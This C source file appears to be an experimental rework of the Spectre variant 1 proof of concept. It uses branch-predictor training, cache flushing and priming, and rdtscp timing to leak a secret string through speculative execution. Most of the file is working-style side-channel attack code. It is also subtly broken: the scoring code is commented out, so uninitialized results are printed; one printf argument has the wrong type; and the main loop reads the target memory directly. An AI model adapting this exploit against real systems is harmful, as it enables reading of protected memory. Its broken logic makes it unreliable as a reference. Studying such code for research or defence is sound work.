#include <stdio.h>
#include <stdlib.h>
#include <stdint.h>
#ifdef _MSC_VER
#include <intrin.h> /* for rdtscp and clflush */
#pragma optimize("gt",on)
#else
#include <x86intrin.h> /* for rdtscp and clflush */
#endif

#define DIST 64 // 64 * 4 for preventing prefetching
#define INDICES 64 // 16 * ways
#define WAY 8
#define LINE 64
#define SET 64 

/********************************************************************
Victim code.
********************************************************************/
unsigned int array1_size = 16;
uint8_t unused1[64];
uint8_t array1[0xF40] = {
  1,
  2,
  3,
  4,
  5,
  6,
  7,
  8,
  9,
  10,
  11,
  12,
  13,
  14,
  15,
  16
};
uint8_t unused2[64];
uint8_t array2[WAY * SET * LINE]; // for prime
uint8_t array3[WAY * SET * LINE]; // for eviction
uint8_t array4[WAY * SET * LINE]; // for 2nd eviction
//uint8_t unused3[64];

char * secret = "The Magic Words are Squeamish Ossifrage.";

uint8_t temp = 0; /* Used so compiler won’t optimize out victim_function() */

void victim_function(size_t x) {
  if (x < array1_size) {
    temp &= array3[array1[x] * DIST];
  }
}

/********************************************************************
Analysis code
********************************************************************/
#define CACHE_HIT_THRESHOLD 80 /* assume cache hit if time <= threshold */
#define L1_CACHE_HIT_THRESHOLD 40 // for L1 Cache hit //

/* Report best guess in value[0] and runner-up in value[1] */
void readMemoryByte(size_t malicious_x, uint8_t value[2], int score[2]) {
  //static int results[WAY * INDICES];
  int tries, i, j, k, mix_i, junk = 0;
  size_t training_x, x;
  register uint64_t time1, time2;
  volatile uint8_t * addr;

  /*for (i = 0; i < WAY; i++){
	  for(j = 0; i< INDICES ; j++){
		  ((int*)array2)[i * INDICES + j] = 0;
	  }
  }*/

  for (tries = 16; tries > 0; tries--) {
	printf("try %d\n",tries);
    /* Flush array2[256*(0..255)] from cache */
    for (i = 0; i < WAY; i++){
	  for (j = 0; j < INDICES ; j++) {
        _mm_clflush( & array2[(i * INDICES + j) * DIST]); /* intrinsic for clflush instruction */
	  }
	}

	// prime data over cache
	//printf("priming...\n");
	for( i=0;i < WAY - 1;i++) {
		for( j = 0; j < INDICES; j++) {
			temp&= array2[(i * INDICES + j) * DIST];
		}
	}


    /* 30 loops: 5 training runs (x=training_x) per attack run (x=malicious_x) */
    training_x = tries % array1_size;
    for (j = 29; j >= 0; j--) {
      	_mm_clflush( & array1_size);
      	for (volatile int z = 0; z < 100; z++) {} //* Delay (can also mfence) /

      	//* Bit twiddling to set x=training_x if j%6!=0 or malicious_x if j%6==0 /
      	//* Avoid jumps in case those tip off the branch predictor /
      	x = ((j % 6) - 1) & ~0xFFFF; //* Set x=FFF.FF0000 if j%6==0, else x=0 /
      	x = (x | (x >> 16)); //* Set x=-1 if j&6=0, else x=0 /
      	x = training_x ^ (x & (malicious_x ^ training_x));

      	//* Call the victim! /
      	//victim_function(x);
  	  	if (x < array1_size) {
    		temp &= array3[array1[x] * DIST + 0x40];
    		//temp &= array3[0x00 * DIST + 0x40];
  		}
    }
	training_x = tries % array1_size;
    for (j = 29; j >= 0; j--) {
      	_mm_clflush( & array1_size);
      	for (volatile int z = 0; z < 100; z++) {} //* Delay (can also mfence) /

      	//* Bit twiddling to set x=training_x if j%6!=0 or malicious_x if j%6==0 /
      	//* Avoid jumps in case those tip off the branch predictor /
      	x = ((j % 6) - 1) & ~0xFFFF; //* Set x=FFF.FF0000 if j%6==0, else x=0 /
      	x = (x | (x >> 16)); //* Set x=-1 if j&6=0, else x=0 /
      	x = training_x ^ (x & (malicious_x ^ training_x));

      	//* Call the victim! /
      	//victim_function(x);
  	  	if (x < array1_size) {
    		temp &= array4[array1[x] * DIST];
    		//temp &= array3[0x00 * DIST + 0x40];
  		}
    }

	//printf("probing...\n");
    /* Time reads. Order is lightly mixed up to prevent stride prediction */
    for (i = 0; i < WAY; i++) {
		for ( j = 0; j < INDICES ; j++) {
	      	addr = & array2[(i * INDICES + j) * DIST];
    	  	time1 = __rdtscp( & junk); /* READ TIMER */
      		junk = * addr; /* MEMORY ACCESS TO TIME */
      		time2 = __rdtscp( & junk) - time1; /* READ TIMER & COMPUTE ELAPSED TIME */
	  		/*printf("%03d : 0x%02X's access time is %d : ",i,mix_i,time2);
	  		if(time2 <= L1_CACHE_HIT_THRESHOLD ){
				  printf("hit\n");
	  		} else {
				  printf("miss\n");
			}*/
			//results[i * INDICES + j] = time2;
			((int*)array2)[i * INDICES + j] = time2;
      		/*if (time2 >= L1_CACHE_HIT_THRESHOLD && i != array1[tries % array1_size])
        		results[i % INDICES]++; //* cache miss - add +1 to score for this value */
		}
    }

	for (i = 0; i< WAY ; i++){
		printf("way %d\n",i);
		for (j = 0; j < INDICES; j++){
      		addr = & array2[(i * INDICES + j) * DIST];
			time2 = ((int*)array2)[i * INDICES + j];
			printf("ind %02d, address %p, time %ld",j, addr, time2);
			if (time2 > L1_CACHE_HIT_THRESHOLD){
				printf(" miss\n");
			} else {
				printf(" hit\n");
			}

		}
	}
    /* Locate highest & second-highest results results tallies in j/k */
    /*j = k = -1;
    for (i = 0; i < INDICES; i++) {
      if (j < 0 || results[i] >= results[j]) {
        k = j;
        j = i;
      } else if (k < 0 || results[i] >= results[k]) {
        k = i;
      }
    }
    if (results[j] >= (2 * results[k] + 5) || (results[j] == 2 && results[k] == 0))
      break; /* Clear success if best is > 2*runner-up + 5 or 2/0) */
  }
  //results[0] ^= junk; /* use junk so code above won’t get optimized out*/
  //value[0] = (uint8_t) j;
  //score[0] = results[j];
  //value[1] = (uint8_t) k;
  //score[1] = results[k];
}

int main(int argc,
  const char * * argv) {
  size_t malicious_x = (size_t)(secret - (char * ) array1); /* default for malicious_x */
  int i, score[2], len = 2;
  uint8_t value[2];

  for (i = 0; i < sizeof(array3); i++)
    array3[i] = 1; /* write to array2 so in RAM not copy-on-write zero pages */
  if (argc == 3) {
    sscanf(argv[1], "%p", (void * * )( & malicious_x));
    malicious_x -= (size_t) array1; /* Convert input value into a pointer */
    sscanf(argv[2], "%d", & len);
  }

  printf("%p,%p,%p\n", array2, array3, array4);
  printf("Reading %d bytes:\n", len);
  while (--len >= 0) {
    printf("Reading at malicious_x = %p... : %c\n", (void * ) malicious_x, *(char*)(array1 + malicious_x));
    readMemoryByte(malicious_x++, value, score);
    printf("%s: ", (score[0] >= 2 * score[1] ? "Success" : "Unclear"));
    printf("0x%02X=’%c’ score=%d ", value[0],
      (value[0] > 31 && value[0] < 127 ? value[0] : "?"), score[0]);
    if (score[1] > 0)
      printf("(second best: 0x%02X score=%d)", value[1], score[1]);
    printf("\n\n\n\n\n\n\n\n\n");
  }
  while( len++<40) {
	  printf("%x", (*(secret+len))%16);
  }
  return (0);
}
